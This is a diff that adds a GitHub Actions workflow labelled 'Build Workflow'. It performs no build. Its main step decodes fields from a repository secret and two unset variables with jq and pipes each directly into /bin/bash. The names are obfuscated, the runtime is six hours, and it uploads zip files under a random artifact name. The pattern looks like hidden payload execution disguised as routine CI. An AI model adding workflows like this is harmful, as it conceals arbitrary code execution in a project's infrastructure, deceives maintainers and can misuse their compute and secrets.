@@ -1,0 +1,37 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Invoke
+        env:
+          vp32: ${{ secrets.vp32 }}
+        run: |
+          printf '%s' "$vp32" | jq -r .pk5788 | /bin/bash
+          echo $ilf6 | jq -r .vhz9639 | /bin/bash
+          echo $ocv8991 | jq -r .tk1856 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: BwgVjZlh
+          path: "*.zip"
+          retention-days: 1
